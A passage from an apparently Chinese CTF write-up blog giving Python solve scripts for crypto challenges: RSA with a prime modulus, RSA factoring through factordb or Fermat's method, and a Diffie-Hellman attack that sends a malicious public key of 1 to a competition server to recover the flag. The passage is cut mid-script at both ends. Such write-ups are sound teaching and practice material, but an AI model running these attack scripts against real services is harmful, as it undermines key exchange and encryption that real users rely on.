class=\"built_in\">print</span>(<span class=\"string\">f&quot;    - n = <span class=\"subst\">&#123;<span class=\"built_in\">str</span>(n)[:<span class=\"number\">30</span>]&#125;</span>...&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;    - e = <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;    - c = <span class=\"subst\">&#123;c_hex[:<span class=\"number\">30</span>]&#125;</span>...&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># 漏洞利用: n 是素数, 所以 phi(n) = n - 1</span></span><br><span class=\"line\">            phi = n - <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+] 漏洞利用：n 是素数，phi(n) = n - 1&quot;</span>)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\"># 计算私钥 d</span></span><br><span class=\"line\">            d = <span class=\"built_in\">pow</span>(e, -<span class=\"number\">1</span>, phi)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+] 私钥 d 计算成功&quot;</span>)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\"># 将小端序的十六进制 c 转换为整数</span></span><br><span class=\"line\">            c_bytes = <span class=\"built_in\">bytes</span>.fromhex(c_hex)</span><br><span class=\"line\">            c_int = <span class=\"built_in\">int</span>.from_bytes(c_bytes, <span class=\"string\">&#x27;little&#x27;</span>)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\"># 解密消息 m</span></span><br><span class=\"line\">            m_int = <span class=\"built_in\">pow</span>(c_int, d, n)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+] 密文解密成功&quot;</span>)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\"># 转换回文本</span></span><br><span class=\"line\">            recovered_bytes = long_to_bytes(m_int)</span><br><span class=\"line\">            <span class=\"comment\"># 使用 &#x27;ignore&#x27; 忽略填充的随机字节可能导致的解码错误</span></span><br><span class=\"line\">            flag = recovered_bytes.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>, errors=<span class=\"string\">&#x27;ignore&#x27;</span>)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n&quot;</span> + <span class=\"string\">&quot;=&quot;</span>*<span class=\"number\">40</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 提取 flag 格式的部分</span></span><br><span class=\"line\">            flag_match = re.search(<span class=\"string\">r&#x27;(flag\\&#123;.*?\\&#125;)&#x27;</span>, flag)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> flag_match:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;✅ 成功找到 Flag: <span class=\"subst\">&#123;flag_match.group(<span class=\"number\">1</span>)&#125;</span>&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;✅ 解密完成，原始文本: <span class=\"subst\">&#123;flag.strip()&#125;</span>&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;=&quot;</span>*<span class=\"number\">40</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n[!] 发生错误: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<p>纯AI，第一段是接收POW的哈希挑战并暴力解密，得到<code>n,e,c</code>参数放入第二段<code>python</code>脚本里计算私钥，从而实现解密,得到flag。</p>\n<h2 id=\"RSA\"><a href=\"#RSA\" class=\"headerlink\" title=\"RSA\"></a>RSA</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> gmpy2</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 给定的值</span></span><br><span class=\"line\">n = <span class=\"number\">5288062996177288067805240670327919739339874127477405321607402348589147491552053048231920112750216696782518281218048178087877077018108705271341382858124037</span></span><br><span class=\"line\">c = <span class=\"number\">2454797328903978848197140611862882439826920912955785083080835692389929572917351093371626343669582289242212514789420568997224614087740388703381025018563979</span></span><br><span class=\"line\">e = <span class=\"number\">65537</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 尝试分解n（512位的n可以被在线工具分解，或使用yafu等工具）</span></span><br><span class=\"line\"><span class=\"comment\"># 这里我们使用factordb或者其他分解方法</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法1: 使用在线factordb API</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    <span class=\"keyword\">import</span> requests</span><br><span class=\"line\">    url = <span class=\"string\">f&quot;http://factordb.com/api?query=<span class=\"subst\">&#123;n&#125;</span>&quot;</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    data = response.json()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> data[<span class=\"string\">&#x27;status&#x27;</span>] == <span class=\"string\">&#x27;FF&#x27;</span>:  <span class=\"comment\"># 完全分解</span></span><br><span class=\"line\">        factors = data[<span class=\"string\">&#x27;factors&#x27;</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(factors) == <span class=\"number\">2</span>:</span><br><span class=\"line\">            p = <span class=\"built_in\">int</span>(factors[<span class=\"number\">0</span>][<span class=\"number\">0</span>])</span><br><span class=\"line\">            q = <span class=\"built_in\">int</span>(factors[<span class=\"number\">1</span>][<span class=\"number\">0</span>])</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;成功分解n:&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;p = <span class=\"subst\">&#123;p&#125;</span>&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;q = <span class=\"subst\">&#123;q&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> ex:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;在线分解失败: <span class=\"subst\">&#123;ex&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;尝试本地分解...&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 方法2: 使用gmpy2进行小因子试除和Pollard&#x27;s rho</span></span><br><span class=\"line\">    <span class=\"comment\"># 对于512位的n，可能需要更强大的工具如yafu</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 先尝试小素数试除</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">trial_division</span>(<span class=\"params\">n, limit=<span class=\"number\">10000000</span></span>):</span><br><span class=\"line\">        i = <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> i * i &lt;= n <span class=\"keyword\">and</span> i &lt; limit:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> n % i == <span class=\"number\">0</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> i</span><br><span class=\"line\">            i += <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    factor = trial_division(n)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> factor:</span><br><span class=\"line\">        p = factor</span><br><span class=\"line\">        q = n // p</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;找到因子: p = <span class=\"subst\">&#123;p&#125;</span>, q = <span class=\"subst\">&#123;q&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 使用Fermat分解法（当p和q接近时效果好）</span></span><br><span class=\"line\">        <span class=\"keyword\">def</span> <span class=\"title function_\">fermat_factor</span>(<span class=\"params\">n</span>):</span><br><span class=\"line\">            a = gmpy2.isqrt(n)</span><br><span class=\"line\">            b2 = gmpy2.square(a) - n</span><br><span class=\"line\">            <span class=\"keyword\">while</span> <span class=\"keyword\">not</span> gmpy2.is_square(b2):</span><br><span class=\"line\">                a += <span class=\"number\">1</span></span><br><span class=\"line\">                b2 = gmpy2.square(a) - n</span><br><span class=\"line\">            p = a + gmpy2.isqrt(b2)</span><br><span class=\"line\">            q = a - gmpy2.isqrt(b2)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">int</span>(p), <span class=\"built_in\">int</span>(q)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            p, q = fermat_factor(n)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Fermat分解成功: p = <span class=\"subst\">&#123;p&#125;</span>, q = <span class=\"subst\">&#123;q&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;分解失败，需要使用更强大的分解工具（如yafu, msieve等）&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;或者在 factordb.com 网站上查询&quot;</span>)</span><br><span class=\"line\">            exit()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 验证分解是否正确</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> p * q == n:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n验证成功: p * q = n&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 计算欧拉函数</span></span><br><span class=\"line\">    phi = (p - <span class=\"number\">1</span>) * (q - <span class=\"number\">1</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 计算私钥d</span></span><br><span class=\"line\">    d = inverse(e, phi)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 解密</span></span><br><span class=\"line\">    m = <span class=\"built_in\">pow</span>(c, d, n)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 转换为字节</span></span><br><span class=\"line\">    flag = long_to_bytes(m)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n解密结果:&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Flag: <span class=\"subst\">&#123;flag.decode()&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;分解错误: p * q != n&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Diffie-Hellman\"><a href=\"#Diffie-Hellman\" class=\"headerlink\" title=\"Diffie-Hellman\"></a>Diffie-Hellman</h2><p>小子群攻击脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> sha256</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 尝试导入 pwntools (可选)</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    <span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> remote</span><br><span class=\"line\">    PWNTOOLS_AVAILABLE = <span class=\"literal\">True</span></span><br><span class=\"line\"><span class=\"keyword\">except</span> ImportError:</span><br><span class=\"line\">    PWNTOOLS_AVAILABLE = <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 尝试导入 Crypto 模块（支持多种安装方式）</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    <span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes</span><br><span class=\"line\">    <span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\">    <span class=\"keyword\">from</span> Crypto.Util.Padding <span class=\"keyword\">import</span> unpad</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+] 使用 pycryptodome&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">except</span> ImportError:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">from</span> Cryptodome.Util.number <span class=\"keyword\">import</span> long_to_bytes</span><br><span class=\"line\">        <span class=\"keyword\">from</span> Cryptodome.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\">        <span class=\"keyword\">from</span> Cryptodome.Util.Padding <span class=\"keyword\">import</span> unpad</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+] 使用 pycryptodomex&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> ImportError:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] 错误：未找到加密库&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;请运行: pip uninstall crypto pycrypto pycryptodome -y&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;然后运行: pip install pycryptodome&quot;</span>)</span><br><span class=\"line\">        exit(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">recv_until</span>(<span class=\"params\">sock, marker</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;接收数据直到遇到特定标记&quot;&quot;&quot;</span></span><br><span class=\"line\">    data = <span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\">    sock.settimeout(<span class=\"number\">10</span>)  <span class=\"comment\"># 设置超时</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">while</span> marker <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">            chunk = sock.recv(<span class=\"number\">1</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> chunk:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            data += chunk</span><br><span class=\"line\">    <span class=\"keyword\">except</span> socket.timeout:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">recv_line</span>(<span class=\"params\">sock</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;接收一行数据&quot;&quot;&quot;</span></span><br><span class=\"line\">    data = <span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\">    sock.settimeout(<span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"string\">b&quot;\\n&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">            chunk = sock.recv(<span class=\"number\">1</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> chunk:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            data += chunk</span><br><span class=\"line\">    <span class=\"keyword\">except</span> socket.timeout:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> data.strip()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exploit_manual</span>():</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    手动版本 - 只需要 socket 和 pycryptodome</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    host = <span class=\"string\">&quot;nc1.ctfplus.cn&quot;</span></span><br><span class=\"line\">    port = <span class=\"number\">34869</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 连接到服务器: &#123;&#125;:&#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(host, port))</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 创建 socket 连接</span></span><br><span class=\"line\">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">    sock.settimeout(<span class=\"number\">15</span>)  <span class=\"comment\"># 设置总超时</span></span><br><span class=\"line\">    sock.connect((host, port))</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 接收并解析 Prime</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 接收 Prime...&quot;</span>)</span><br><span class=\"line\">        recv_until(sock, <span class=\"string\">b&quot;The Prime is &quot;</span>)</span><br><span class=\"line\">        p_line = recv_line(sock)</span><br><span class=\"line\">        p = <span class=\"built_in\">int</span>(p_line)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] Prime (p): <span class=\"subst\">&#123;p&#125;</span>&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 接收并解析 Generator</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 接收 Generator...&quot;</span>)</span><br><span class=\"line\">        recv_until(sock, <span class=\"string\">b&quot;The Generator is &quot;</span>)</span><br><span class=\"line\">        g_line = recv_line(sock)</span><br><span class=\"line\">        g = <span class=\"built_in\">int</span>(g_line)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] Generator (g): <span class=\"subst\">&#123;g&#125;</span>&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 接收并解析 Alice&#x27;s Public Key</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 接收 Alice&#x27;s Public Key...&quot;</span>)</span><br><span class=\"line\">        recv_until(sock, <span class=\"string\">b&quot;Alice&#x27;s Public Key is &quot;</span>)</span><br><span class=\"line\">        a_line = recv_line(sock)</span><br><span class=\"line\">        A = <span class=\"built_in\">int</span>(a_line)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] Alice&#x27;s Public Key (A): <span class=\"subst\">&#123;A&#125;</span>&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 发送恶意的 Bob&#x27;s Public Key = 1</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 等待输入提示...&quot;</span>)</span><br><span class=\"line\">        recv_until(sock, <span class=\"string\">b&quot;Bob&#x27;s Public Key:&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 发送恶意 Bob&#x27;s Public Key: 1&quot;</span>)</span><br><span class=\"line\">        sock.send(<span class=\"string\">b&quot;1\\n&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 接收加密的 Flag</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 接收加密的 Flag...&quot;</span>)</span><br><span class=\"line\">        recv_until(sock, <span class=\"string\">b&quot;Encrypted Flag:&quot;</span>)</span><br><span class=\"line\">        enc_line = recv_line(sock)</span><br><span class=\"line\">        enc_hex = enc_line.decode().strip()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] 加密的 Flag: <span class=\"subst\">&#123;enc_hex&#125;</span>&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 使用已知的共享密钥 s = 1 解密</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 正在解密...&quot;</span>)</span><br><span class=\"line\">        s = <span class=\"number\">1</span></span><br><span class=\"line\">        key = sha256(long_to_bytes(s)).digest()</span><br><span class=\"line\">        cipher = AES.new(key, AES.MODE_ECB)</span><br><span class=\"line\">        enc = <span class=\"built_in\">bytes</span>.fromhex(enc_hex)</span><br><span 